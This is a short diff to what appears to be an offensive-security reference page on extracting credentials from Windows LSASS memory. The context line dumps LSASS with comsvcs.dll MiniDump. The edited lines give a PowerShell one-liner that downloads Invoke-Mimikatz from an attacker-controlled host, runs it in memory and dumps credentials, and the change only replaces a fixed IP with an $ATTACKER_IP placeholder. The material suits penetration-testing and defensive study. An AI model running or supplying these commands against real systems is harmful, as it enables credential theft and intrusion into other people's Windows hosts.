@@ -106,7 +106,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s exfiltration script [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) (PowerShell) can be used to extract credential material from LSASS's process memory.
 
 ```bash
-powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
+powershell IEX (New-Object System.Net.Webclient).DownloadString("http://$ATTACKER_IP/Invoke-Mimikatz.ps1") ; Invoke-Mimikatz -DumpCreds
 ```
 
 :::
